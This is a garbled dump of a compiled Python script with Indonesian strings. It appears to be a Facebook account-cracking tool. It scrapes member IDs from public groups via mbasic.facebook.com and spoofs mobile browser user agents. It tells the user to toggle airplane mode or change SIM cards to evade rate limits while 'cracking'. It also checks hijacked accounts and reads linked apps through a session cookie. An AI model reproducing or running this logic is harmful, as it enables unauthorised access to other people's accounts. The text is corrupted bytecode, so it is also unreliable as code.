Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIrw   ry   r�   z] Mulaiz# PROSES CEK OPSI DIMULAIrv   rN   r   r�   r   r}   z%s++++ %s ----> Error      %sz2%s---> Pemisah Tidak Didukung Untuk Program Ini%sz%s---> %s/%s ---> { %s }%sr�   r�   zxMozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36rd  r�   r"   re  r�   rf  r�   r�   rg  rh  r�   ri  rj  rk  r�   rl  r�   rm  Trn  ro  r�   rp  rq  rh   r   r�   rr  rs  rt  ru  rv  rw  z#%s---> Tidak Dapat Mengecek Opsi%sr�   z%s++++ %s|%s ----> OK       %sz"%s++++ %s|%s ----> SALAH       %sr�   rf   rM   z# DONE)(r�   rl   r�   r�   rh   ri   rI   r]   r	   r\   r�   �
IndexErrorr   r   r+  r(  r&  r'  r)  r*  r,  r   r;   r=   r   r�   r   rx  r5  r   r  r6  r7  ry  r�   r   rz  rZ   r[   r   )r�  r�   r�   ZloveZkesr   rB  r=  r@  r�   �headerr|  r}  r~  r�   r  r�  r�  r�  r�  ra   Zdahr   r   r   r�     sr   
"
�($
"
�$
�
�
r�   c                 C   r7   r8   r:   r>   r   r   r   rA   W  �
   
�c                 C   r7   rC   r:   r>   r   r   r   rD   \  r�  c                   C   s@   t dt t d ttt�� d � ttt d � 	 t�  d S )N�z Total ID : z                     z8 Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack )r	   �balmond�mr   r�   r   rh   r�   r   r   r   r   �lahc  s   $
r�  c                  C   s�  d} t | dd�}t� �|� tdt t d �}d}d|i}d| }t�� }zt|j	||d	�j
d
�}W n tjjyN   ttt d � t�d� t�  Y nw |�d�}|j
�dd��dd�}	|	dkrtttt d � t�d� t�  n|	dkr�ttt d � t�d� t�  n	 tdt t d |	 � |�d�}
g }|
D ]}|j
}|�dd�}zt|�}|�|�}W q�   Y q�t|�dkr�ttt d � nttt d t|d � � t|� d S )Nz# PASTIKAN ID GROUP PUBLIKrP   rN   r�   z! [1;96mId Atau User Name Grup : ��Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gbar�   z#https://mbasic.facebook.com/groups/r_  ro  z# [1;33mKoneksi Internet Terputus..g      �?rx   � | Facebook� Grup Publik�Masuk Facebookz- Limit, Silahkan Mode Pesawat Dan Coba Lagi..Z	Kesalahanz [1;33mGrup Tidak Ditemukan..z [1;32mNama Grup : �tableZAnggotar   z Anggota : -z Anggota : )r\   r]   r	   rh   r�  rI   r   r�   rx  r   r   rZ   r[   r�  r   r   r   ry  r�   rA   r�   rz  r�   rT   r�   r   �grup1)�winZwin2r   r@  �miskinlu�urlr�   ZgnZberrZberr2ZggsZang�ffZanggoZbroZmexZjumlahr   r   r   �grupi  sR   

�



r�  c                 C   s�  g }t �� }tdt t d � ttt d � ttt d � 	 �zd}d|i}z|d }W n   | }Y t|j||d	�jd
�}|�d�}|D ]$}t	|��
d�}	d|	v rlt	|��dd��dd�}
|
�
d�d �dd�}qH|�d�}|D ]�}|j}|�
d�}d|v r�t�dt	|��}|d �dd�}|�dd�}|d | }|tv r�qtt�|� tdt t d t d t	tt�� t d dd� tj��  qtd|v �rt�dt	|��}|d �dd�}|�
d�d }|d | }|tv r�qtt�|� tdt t d t d t	tt�� t d dd� tj��  qtqtz|}|�dd| � W n   |�d �}|j�d!d��d"d�}|d#k�r;nt�  Y W n- t jj�ya   zt�d$� W n t�y^   t�  Y nw Y n t�ym   t�  Y nw q!)%Nr�   z( [1;32mJika Stack, Mode Pesawat 5 Detikz [1;32mSedang Mengumpulkan IDz! [1;32mTekan CTRL + C Untuk StopTr�  r�   r   r_  ro  r  �>zLihat Postingan Lainnya</spanz	<a href="zamp;r�   z"><imgr�  Z
mengajukanzcontent_owner_id_new.\w+zcontent_owner_id_new.z mengajukan pertanyaan .r�   r�  z { zProses Mengambil ID z }r�   z > zMengumpulkan ID re  rx   r�  r�  r�  r%  )r   r�   r	   r�  r�  rx  r   r   rz  r   r�   r�   r2  r:  r   rT   rI   r)  r�   r   r;   r=   �Or�   ry  r�  rZ   r[   r   r   �KeyboardInterrupt)ZurlsZuser�   r@  r�  r�  �setZbf2�g�cssZbcjZbcj2rm   ZcariZliatnihZsplZidsiapaZidyouZnamayouZidkuZlink_ZgirangZgirang2r   r   r   r�  �  s�   
�


@

@

�
��
��r�  c              
   C   sL  t �� }|jddd|  id�j}t�|d�}|jddd�}d	d
� |�d�D �}ztt	|��D ]}t
dt|d t|| �dd�f � q.W n tyS   t
dt � Y nw |jddd|  id�j}t�|d�}|jddd�}dd
� |�d�D �}ztt	|��D ]}t
dt|d t|| �dd�f � q~W d S  ty�   t
dt � Y d S w )Nr  �cookieznoscript=1;rc  ro  rp  r5  )r�   c                 S   �   g | ]}|j �qS r   �r   �r�   �ir   r   r   r   �  �    zcek_apk.<locals>.<listcomp>Zh3z
  %s%s. %s%sr   zDitambahkan padaz Ditambahkan padau   
%s• cookie invalidr  c                 S   r�  r   r�  r�  r   r   r   r   �  r�  z
   %s%s. %s%sZKedaluwarsaz Kedaluwarsa)r   r�   r   r   �bs4r   ry  rz  r�   r�   r	   rk   �Hr�   �AttributeErrorrj   )rF  rI  rd   Zsopri   Zgamer�  r   r   r   r<  �  s.   &��&��r<  �__main__zgit pullr|   r�   )zr   r   �
subprocess�platformr   r�  rU   r&  �datetimer   r2  Zrich�ImportErrorrF   r   r   Z
rich.tabler   �meZrich.consoler   r]   r   rx  Zconcurrent.futuresr   r�   r   ZgpZ
rich.panelr   r�   r	   r�   r   Zrich.markdownr   r\   Zrich.columnsr    r�   rQ   rR   �
splitlinesr0  r1  r   r�   r-  r.  r/  rl   r�   r�   Z	lisensikur�   rS   r�   Zlisensikuniri   r)  rI   r,  r(  r*  r+  r�   rk   �J�S�N�I�Crj   �U�K�Qr�  �GZIIr�  r�  r�  Zwarr'  �BZdicZdic2�now�dayZtglr   �monthZbln�yearZthnr�   r�   rA   rD   rE   rH   rJ   rG   rY   rW   rt   ru   rs   r�   r�   r�   r�   r�   r8  r�   r�  r�  r�  r<  �__name__�mkdirr   r   r   r   �<module>   s�    H

���8((rA0+*j!j9+C


�